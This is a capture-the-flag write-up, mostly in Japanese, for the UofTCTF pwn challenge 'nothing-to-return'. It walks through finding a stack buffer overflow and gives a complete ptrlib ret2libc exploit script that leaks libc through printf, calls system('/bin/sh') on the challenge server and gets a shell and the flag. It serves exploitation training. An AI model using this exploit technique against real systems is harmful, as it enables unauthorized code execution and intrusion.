# nothing-to-return:Pwn:382pts
Now this challenge has a binary of a very small size.  
"The binary has no useful gadgets! There is just nothing to return to!"  
nice try... ntr  

`nc 34.30.126.104 5000`  
[ld-linux-x86-64.so.2](ld-linux-x86-64.so.2)　　　　[libc.so.6](libc.so.6)　　　　[nothing-to-return](nothing-to-return)  

# Solution
配布ファイルを実行すると、入力サイズを聞かれその後にデータを入力できるようだ。  
printfのアドレスも謎機能としてリークしている。  
明らかなret2libcだ。  
```bash
$ checksec --file=./nothing-to-return --format=csv
Partial RELRO,No Canary found,NX enabled,No PIE,No RPATH,RUNPATH,Symbols,No,0,3,./nothing-to-return
$ ./nothing-to-return
printf is at 0x7fb6554ef250
Hello give me an input
Input size:
10
Enter your input:
AAAAAAAAA
I'm returning the input:
AAAAAAAAA
$ ./nothing-to-return
printf is at 0x7fde039e5250
Hello give me an input
Input size:
1024
Enter your input:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
I'm returning the input:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Segmentation fault
```
サイズを大きくしてやると落ちるので、BOFがありそうだ。  
パディングを計算してやる。  
```bash
$ echo -ne '1024\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEF' | strace -i ./nothing-to-return
~~~
[00007f06433e8664] write(1, "I'm returning the input:", 24I'm returning the input:) = 24
[00007f06433e8664] write(1, "\n", 1
)    = 1
[00007f06433e8664] write(1, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 78AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEF) = 78
[00007f06433e8664] write(1, "\n", 1
)    = 1
[0000464544434241] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x464544434241} ---
[????????????????] +++ killed by SIGSEGV +++
Segmentation fault
```
72文字で埋まるようだ。  
謎機能のprintfのアドレスからlibcのbaseアドレスがわかるので、systemを呼んでやればよい。  
以下のexploit.pyでシェルをとる。  
```python
from ptrlib import *

chall = "./nothing-to-return"
libc = "./libc.so.6"

elf = ELF(chall)
libc = ELF(libc)

#sock = Process(chall)
sock = Socket("nc 34.30.126.104 5000")

printf_leak = sock.recvuntil("\n")
printf_addr = int(printf_leak.replace(b"printf is at ", b"").replace(b"\n", b""), 16)

libc.base = printf_addr - libc.symbol("printf")

sock.recvuntil("Input size:\n")
sock.sendline(b"1024")
sock.recvuntil("Enter your input:\n")

payload = b"A" * 72
payload += p64(next(libc.gadget("ret;")))
payload += p64(next(libc.gadget("pop rdi; ret;")))
payload += p64(next(libc.search("/bin/sh")))
payload += p64(libc.symbol("system"))

sock.sendline(payload)
sock.sh()
```
実行する。  
```bash
$ python exploit.py
[+] __init__: Successfully connected to 34.30.126.104:5000
[+] base: New base address: 0x7b269ae05000
[ptrlib]$ I'm returning the input:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA´\xc3\xa2&{
ls
[ptrlib]$ flag
ld-linux-x86-64.so.2
libc.so.6
run
cat flag
[ptrlib]$ uoftctf{you_can_always_return}
```
flagが得られた。  

## uoftctf{you_can_always_return}